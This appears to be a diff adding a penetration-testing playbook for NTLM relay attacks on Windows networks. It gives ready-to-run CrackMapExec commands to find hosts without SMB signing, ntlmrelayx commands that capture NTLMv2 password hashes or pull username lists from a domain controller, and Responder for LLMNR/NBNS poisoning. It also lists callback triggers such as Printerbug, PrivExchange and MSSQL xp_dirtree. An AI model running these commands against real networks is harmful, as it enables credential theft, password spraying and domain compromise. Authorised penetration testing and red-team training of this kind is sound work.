@@ -1,0 +1,42 @@
+## Impacket - Impacket is a collection of Python classes for working with network protocols.
+https://github.com/SecureAuthCorp/impacket
+## CrackMapExec - A swiss army knife for pentesting networks.
+
+# Scan hosts for SMB Signing Disabled.
+
+crackmapexec -t 20 smb <local.subnet/24> --gen-relay-list /opt/ipt/smb.signing.disabled.txt
+
+# Option.1 password hashes
+# To forward credentials to targets with SMB signing disabled and attempt to extract ntlm password hashes from a host, use this configuration. # # Optional: Create a new tmux window and keep this running in the background.
+
+python3 ./examples/ntlmrelayx.py -ts -smb2support -l /root/ntlmrelayx.loot -of /root/ntlmv2.hashes.captured -tf /root/smb.signing.disabled.txt
+
+# Option.2 user list
+# To forward credentials to the domain controller and extract a list of usernames for password spraying, use this ntlmrelayx configuration. You can find the domain controllers by using 'nslookup <domain>' command using the domain from CrackMapExec.
+# Optional: Create a new tmux window and keep this running in the background. 
+
+python3 ./examples/ntlmrelayx.py -ts -smb2support -l /root/ntlmrelayx.loot -of /root/ntlmv2.hashes.captured -t ldaps://<domain.controller.ip>
+
+# Start responder and monitor ntlmrelayx window
+
+responder -I <interface> -wrfv
+
+# If LLMNR & NBNS traffic is limited. Move to 2.mitm6 and use IPv6 to manipulate traffic for ntlmrelayx.
+#
+# Otherwise, let this attack run in the background and continue to the 3.enumeration directory.
+
+#PrivExchange, Printerbug, MSSQL xp_dirtree to trigger Responder/ntlmrelayx
+
+There are a couple of techniques that can be used to trigger a call back from an application to hit your relay. They typically need a user that has domain/mssql/exchange access.
+
+Printerbug:
+https://github.com/dirkjanm/krbrelayx.git
+
+PrivExchange:
+https://github.com/dirkjanm/PrivExchange
+
+MSSQL xp_dirtree:
+Metasploit MSSQL NTLM stealer
+PowerupSQL unc path injection: https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
+
+Set up your relay and trigger one of these callbacks to hit your relay setup. 
